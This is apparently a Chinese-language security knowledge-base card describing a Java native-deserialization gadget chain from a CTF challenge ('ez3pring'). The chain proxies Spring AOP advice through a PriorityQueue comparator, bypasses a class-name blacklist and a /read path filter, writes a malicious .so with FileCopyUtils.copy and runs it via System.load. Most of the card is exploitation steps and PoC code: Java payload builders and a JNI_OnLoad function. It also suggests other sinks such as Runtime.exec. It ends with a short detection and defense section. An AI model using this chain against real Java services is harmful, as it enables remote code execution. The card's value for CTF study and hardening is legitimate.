---
id: web-java-deser-spring-aop-methodbeforeadvice-priorityqueue-arbitrary-method
title: Spring AOP MethodBeforeAdvice + PriorityQueue 比较器链：绕过危险类黑名单调用任意静态方法写 .so 并 System.load
type: scenario
domain: web
path: web/java/deserialization
technique: spring-aop-methodbeforeadvice-priorityqueue-arbitrary-method
tags:
- java
- deserialization
- spring
- aop
- aspectj
- priorityqueue
- gadget-chain
- blacklist-bypass
- jni
- native
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: orchestrator-fix
  verified_at: '2026-11-06T01:58:26+08:00'
  notes: V115 发现该卡未实际入库；已从 staging 草稿重新 kb add 并 verify，内容与原文一致
url: /docs/web/java/deserialization/web-java-deser-spring-aop-methodbeforeadvice-priorityqueue-arbitrary-method/
draft: false
kb_aliases:
- ez3pring
- AspectJMethodBeforeAdvice
- MethodBeforeAdviceInterceptor
- PriorityQueue comparator advice
- FileCopyUtils.copy
- System.load JNI_OnLoad
- Java 原生反序列化黑名单绕过
---

## 一句话结论

当原生反序列化入口只按类名黑名单禁用 `POJONode`、`SignedObject`、`JdbcRowSetImpl` 时，可以用 Spring AOP 的 `AspectJMethodBeforeAdvice` + `MethodBeforeAdviceInterceptor` 构造一个通用“方法调用转发器”：`PriorityQueue.readObject()` 在堆化/比较时调用 `Comparator.compare()` 或 `Comparable.compareTo()`，代理进入 Spring AOP 拦截器后反射调用任意静态方法；先调 `FileCopyUtils.copy(byte[], File)` 写恶意 `.so`，再调 `System.load(String)` 加载，`JNI_OnLoad` 读 flag 并以 `SecurityException` 消息带回。

## 原理

- 入口：`/read?data=<base64>` 直接 `new NewObjectInputStream(...).readObject()`；`NewObjectInputStream.resolveClass()` 只拒绝三个类名：
  - `com.fasterxml.jackson.databind.node.POJONode`
  - `java.security.SignedObject`
  - `com.sun.rowset.JdbcRowSetImpl`
- 这类黑名单只覆盖已知链的入口类，不限制 Spring AOP、AspectJ、`PriorityQueue`、JDK 代理等“非黑名单”类；只要找到一条不经过被禁类的调用链即可。
- `PriorityQueue.readObject()` 会恢复元素并调用 `heapify()`，堆化过程调用比较器：
  - 若 `comparator != null`，调用 `comparator.compare(a,b)`；
  - 否则调用元素的 `compareTo`。
- Spring AOP 可以把一次普通方法调用转成反射调用：
  - `MethodBeforeAdviceInterceptor.invoke()` 在目标方法前调用 `AspectJMethodBeforeAdvice.before()`；
  - `AspectJMethodBeforeAdvice` 持有 `declaringClass`/`methodName`/`parameterTypes`/`aspectInstanceFactory`，`before()` 通过反射在目标实例上调用指定方法，并把 pointcut 绑定的参数传进去。
- 攻击者构造一个实现 `Comparator`/`Comparable` 的 JDK 动态代理，代理的 `InvocationHandler` 是 Spring AOP 的 `JdkDynamicAopProxy`，Advisor 指向 `AspectJMethodBeforeAdvice`；当 `PriorityQueue` 调用 `compare/compareTo` 时，代理进入 advice，反射调用攻击者指定的方法：
  - 第一个 payload：pointcut `execution(* *.compare(..)) && args(source,destination)`，advice 方法 `FileCopyUtils.copy(byte[], File)`，`PriorityQueue.queue={soBytes, File(remotePath)}` → 写 `.so`。
  - 第二个 payload：pointcut `execution(* *.compareTo(..)) && args(soPath)`，advice 方法 `System.load(String)`，`PriorityQueue.queue={proxy, remotePath}` → 加载 `.so`。
- `System.load()` 会执行 `.so` 的 `JNI_OnLoad`。恶意 `.so` 在 `JNI_OnLoad` 中用 `fopen/glob` 搜索 `/flag`、`/app/flag`、`/root/flag` 等路径，读取首行后 `ThrowNew(SecurityException, flag)`；控制器捕获 `SecurityException` 并把 `e.getMessage()` 返回，flag 直接出现在 HTTP 响应中。
- 入口处的过滤器只对精确路径 `/read` 做拦截，Spring MVC 会把 `/read/` 也路由到同一控制器，因此 `/read/` 可绕过。该路径匹配问题属于通用“原始 URI 与路由解析差异”，见关联卡片。

## 触发条件

- Java 原生反序列化入口，且只使用类名黑名单（未使用 `ObjectInputFilter` 白名单/类加载器隔离）。
- classpath 含 Spring AOP / aspectjweaver（`AspectJMethodBeforeAdvice`、`MethodBeforeAdviceInterceptor`、`JdkDynamicAopProxy`、`ExposeInvocationInterceptor` 等）。
- 目标方法可被反射调用（`FileCopyUtils.copy(byte[],File)`、`System.load(String)` 等），且参数可绑定。
- 目标进程可写文件（如 `/tmp`）并允许 `System.load` 加载本地 `.so`；JNI 可执行（非受限容器）。
- 过滤器路径匹配存在差异（如精确 `/read` vs Spring 的 `/read/`），使反序列化入口可达。

## 利用步骤

1. 侦察：确认 `/read` 入口、黑名单类、Spring/AspectJ 依赖版本；访问 `/read/` 验证过滤器绕过。
2. 编写 JNI `.so`：`JNI_OnLoad` 搜索 `/flag`、`/flag.txt`、`/app/flag`、`/root/flag`、`/home/*/flag` 等，读取首行后 `ThrowNew(SecurityException, flag)`。
3. 构造写文件 payload：
   - `Method write = FileCopyUtils.class.getMethod("copy", byte[].class, File.class)`；
   - `AspectJMethodBeforeAdvice(write, pointcut, SingletonAspectInstanceFactory(""))`，pointcut 表达式 `execution(* *.compare(..)) && args(source,destination)`；
   - 用 `DefaultPointcutAdvisor` + `MethodBeforeAdviceInterceptor` 包装 advice；
   - 外层 `JdkDynamicAopProxy` 代理 `Comparator` + `Serializable`，`PriorityQueue` 的 `queue={soBytes, new File("/tmp/lib.so")}`、`size=2`、`comparator=proxy`；
   - 原生序列化并 base64 发送到 `/read/`。
4. 构造加载 payload：
   - `Method load = System.class.getMethod("load", String.class)`；
   - pointcut `execution(* *.compareTo(..)) && args(soPath)`；
   - 代理 `Comparable` + `Serializable`，`PriorityQueue.queue={proxy, "/tmp/lib.so"}`、`size=2`；
   - 序列化并发送。
5. 观察响应：`JNI_OnLoad` 抛出的 `SecurityException` 消息被控制器返回，flag 出现在 `error: ...` 中。
6. 清理 `.so` 与请求日志（授权测试后）。

## PoC

```java
// 写 .so：Comparator 代理 -> FileCopyUtils.copy(byte[], File)
Method writeMethod = FileCopyUtils.class.getMethod("copy", byte[].class, File.class);
Comparator<Object> proxy = createComparatorProxy(
    writeMethod,
    "execution(* *.compare(..)) && args(source,destination)",
    new String[]{"source", "destination"},
    new Class<?>[]{Object.class, Object.class},
    new String[]{"source", "destination"});

PriorityQueue<Object> queue = new PriorityQueue<>(2);
queue.add(1); queue.add(1);
setField(queue, "comparator", proxy);
setField(queue, "queue", new Object[]{soBytes, new File("/tmp/libez3pring.so")});
setField(queue, "size", 2);
send(Base64.getEncoder().encodeToString(serialize(queue)));
```

```java
// 加载 .so：Comparable 代理 -> System.load(String)
Method loadMethod = System.class.getMethod("load", String.class);
Comparable<Object> proxy = createComparableProxy(
    loadMethod,
    "execution(* *.compareTo(..)) && args(soPath)",
    new String[]{"soPath"}, new Class<?>[]{String.class}, new String[]{"soPath"});

PriorityQueue<Object> queue = new PriorityQueue<>(2);
queue.add("1"); queue.add("1");
setField(queue, "queue", new Object[]{proxy, "/tmp/libez3pring.so"});
setField(queue, "size", 2);
send(Base64.getEncoder().encodeToString(serialize(queue)));
```

```c
JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *vm, void *reserved) {
    JNIEnv *env = NULL;
    char message[512];
    (*vm)->GetEnv(vm, (void **)&env, JNI_VERSION_1_6);
    const char *flag = find_flag(message, sizeof(message)); // fopen/glob 搜索常见 flag 路径
    jclass exClass = (*env)->FindClass(env, "java/lang/SecurityException");
    (*env)->ThrowNew(env, exClass, flag);
    return JNI_VERSION_1_6;
}
```

完整 payload 构造（Advisor、双层代理、Unsafe 写字段）见原文；PoC 未在本机执行。

## 变体与关联

- 变体：`AspectJAroundAdvice`/`AspectJMethodBeforeAdvice` 都可作为反射调用入口；`MethodBeforeAdviceInterceptor`、`AspectJAfterAdvice` 等 advice 类型按目标方法选择。
- 变体：比较触发不限于 `PriorityQueue`；`TreeMap`/`TreeSet`/`Collections.sort` 等也会调用 `compare/compareTo`。
- 变体：任意方法 sink 不限于 `FileCopyUtils.copy`/`System.load`；可用 `Runtime.exec`、`ProcessBuilder.start`、JNDI lookup、文件写入、`TemplatesImpl` 等，取决于 classpath。
- 变体：黑名单只按类名匹配时，可换用未列入黑名单的同类 gadget（Spring AOP、JDK 代理、Hutool、Jackson 其他节点等）。
- 关联卡片：[[web-java-deser-spring-aop-jdk17-templatesimpl-chain]]（Spring AOP `AspectJAroundAdvice` 反射 TemplatesImpl）、[[web-java-framework-spring-custom-auth-path-parsing-bypass]]（`/read` vs `/read/` 原始 URI 与路由解析差异）、[[web-java-deserialization-jackson-pojonode-spring-aop-templatesimpl-jdk17]]（POJONode + Spring AOP 链）、[[web-java-deser-resolveproxyclass-blacklist-hutool-mapproxy]]（黑名单绕过思路）。
- 注意：本例为第四届黄河流域网安赛 ez3pring；目标依赖较新，利用依赖具体 Spring/AspectJ 版本与可调用方法。

## 检测与防御

- 防御：原生反序列化使用 `ObjectInputFilter` 白名单（按类名/包名/数组长度/引用深度），不要依赖黑名单；对不可信输入禁用原生反序列化。
- 防御：不要把 Spring AOP/AspectJ 的 advice 类暴露在反序列化可达的 classpath 中；对 `PriorityQueue`/`TreeMap` 等比较器入口做类白名单。
- 防御：限制 `System.load`/`loadLibrary` 与 JNI 加载（SecurityManager 已废弃时用容器/seccomp/文件系统权限）；应用进程以最小权限运行，flag/敏感文件不可读。
- 防御：修复过滤器路径匹配：使用规范化后的 servlet path/路由匹配，避免 `/read/` 绕过；参见关联卡。
- 检测：反序列化请求中出现 Spring AOP/AspectJ/`PriorityQueue`/`JdkDynamicAopProxy` 类名；`/read/` 等尾斜杠访问；`/tmp` 下新增 `.so`；`System.load` 调用；JNI_OnLoad 抛出的 SecurityException 日志。
- 响应：隔离应用、删除 `.so`、轮换凭据、审计反序列化入口与 classpath、升级/移除不必要的 AOP 反序列化 gadget。
